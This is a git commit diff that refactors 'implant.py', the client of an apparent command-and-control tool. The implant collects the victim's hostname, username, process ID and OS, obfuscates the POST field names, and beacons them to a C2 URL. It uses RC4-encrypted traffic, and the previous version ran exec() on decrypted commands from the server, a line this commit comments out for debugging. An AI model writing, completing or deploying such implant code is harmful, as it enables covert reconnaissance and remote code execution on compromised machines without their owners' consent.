aa8257e66336131d18a462e758d058ffb573c334
root <t3ntman@gmail.com>
2017-04-11 18:20:23 -0600

    Cleaned up implant code

--- Website/templates/implant.py
+++ Website/templates/implant.py
@@ -1,4 +1,15 @@
-import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time, json
+import base64
+import getpass
+import json
+import os
+import platform
+import random
+import socket
+import string
+import sys
+import time
+import urllib
+import urllib2
 
 
 # TO DO: Remove hard-coded value
@@ -12,74 +23,45 @@ sleep_interval = 10
 
 
 def crypt(key, data):
-    S = range(256); j = 0; out = []
+    S = range(256)
+    j = 0
+    out = []
 
     for i in range(256):
         j = (j + S[i] + ord(key[i % len(key)])) % 256
-        S[i] , S[j] = S[j] , S[i]
+        S[i], S[j] = S[j], S[i]
 
     i = j = 0
 
     for char in data:
-        i = ( i + 1 ) % 256
-        j = ( j + S[i] ) % 256
-        S[i] , S[j] = S[j] , S[i]
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
         out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
 
     return "".join(out)
 
 
-def initial_beacon():
+def initial_beacon(hostname, current_user, process_id, operating_system):
     try:
         hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
         current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
         process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
         operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))
 
-        if "Darwin" in platform.system():
-            globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
-        else:
-            globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
-
-        globals()[hostname_var] = socket.gethostname()
-        globals()[current_user_var] = getpass.getuser()
-        globals()[process_id_var] = os.getpid()
-
-        post_data = [(hostname_var, globals()[hostname_var]),
-            (current_user_var, globals()[current_user_var]),
-            (process_id_var, globals()[process_id_var]),
-            (operating_system_var, globals()[operating_system_var])]
+        post_data = [(hostname_var, hostname),
+            (current_user_var, current_user),
+            (process_id_var, process_id),
+            (operating_system_var, operating_system)]
 
         base64_post_data = base64.b64encode(urllib.urlencode(post_data))
+
         request = urllib2.Request(beacon_url, base64_post_data)
         request.add_header("User-Agent", user_agent)
         f = urllib2.urlopen(request)
         response = f.read()
-        print response
         return response
-    except:
-        pass
 
-
-def rc4_beacon(key):
-    try:
-        if "Darwin" in platform.system():
-            operating_system = "Mac OS X " + platform.mac_ver()[0]
-        else:
-            operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
-
-        hostname = socket.gethostname()
-        current_user = getpass.getuser()
-        process_id = os.getpid()
-
-        post_data = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
-        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(post_data)))
-        request.add_header("User-Agent", user_agent)
-        request.add_header("Content-Type", "application/json")
-        f = urllib2.urlopen(request)
-        response = f.read()
-        #print response
-        return response
     except:
         pass
 
@@ -87,11 +69,23 @@ def rc4_beacon(key):
 if __name__ == "__main__":
     counter = 0
 
+    if "Darwin" in platform.system():
+        operating_system = "Mac OS X " + platform.mac_ver()[0]
+
+    else:
+        operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
+
+    hostname = socket.gethostname()
+    current_user = getpass.getuser()
+    process_id = os.getpid()
+
     while True:
         if counter == 0:
-            k = base64.b64decode(initial_beacon())
+            key = base64.b64decode(initial_beacon(hostname, current_user, process_id, operating_system))
+
         else:
-            exec(crypt("123456", rc4_beacon(k)))
+            print "rc4 here" # DEBUGGING
+            #exec(crypt("123456", rc4_beacon(k)))
 
         counter += 1
         time.sleep(sleep_interval)
